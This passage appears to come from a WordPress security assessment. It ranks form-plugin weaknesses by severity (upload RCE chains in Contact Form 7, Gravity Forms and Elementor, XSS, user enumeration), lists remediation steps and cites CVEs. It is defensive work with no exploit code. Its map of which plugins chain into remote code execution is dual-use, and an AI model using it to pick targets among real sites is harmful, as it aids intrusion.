| 3 | Upload Directory Browsing | **High** | Exposes uploaded files; reveals existing shells |
| 4 | Contact Form 7 Detection | **High→Critical** | Version disclosure + file upload = exploit chain |
| 5 | Gravity Forms Detection | **High→Critical** | Known CVEs + file upload capability |
| 6 | Elementor Form Detection | **High→Critical** | Pro version file upload = RCE vector |
| 7 | WPForms / Fluent Forms / Forminator | **Medium→Critical** | Form builder plugins often have upload features |
| 8 | Comment Form Vulnerabilities | **High** | Spam, stored XSS, CSRF |
| 9 | Search Form XSS | **Critical** | Reflected XSS = session theft, phishing |
| 10 | Login Form Analysis | **Low→High** | Info leakage, user enumeration |
| 11 | Registration Form | **High** | Account creation spam, user enumeration |
| 12 | Lost Password | **High** | User enumeration via error messages |

---

## Remediation Priority

1. **Critical (Immediate):** Patch any endpoint that accepts executable file uploads (.php, .phtml, .php5, .shtml). Apply input validation, extension whitelisting, and nonce checks.
2. **High (24h):** Disable directory listing on `/wp-content/uploads/`. Add `.htaccess` with `Options -Indexes`. Enforce nonce checks on all forms. Add rate limiting to comment forms. Unify login/password-reset error messages.
3. **Medium (72h):** Add `autocomplete="new-password"` to login forms. Add CAPTCHA to registration forms. Implement email verification for new accounts.
4. **Low (1 week):** Remove placeholder text that leaks password policy. Add `X-Frame-Options` headers. Enable Akismet or similar anti-spam.

---

## References

- OWASP File Upload Cheatsheet: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- WPScan WordPress Security Scanner: https://wpscan.com/
- WordPress REST API Handbook: https://developer.wordpress.org/rest-api/
- CF7 File Upload CVEs: CVE-2020-35489, CVE-2021-24145
- Gravity Forms Unrestricted Upload: CVE-2020-27847
- Elementor Pro File Upload: CVE-2022-1323
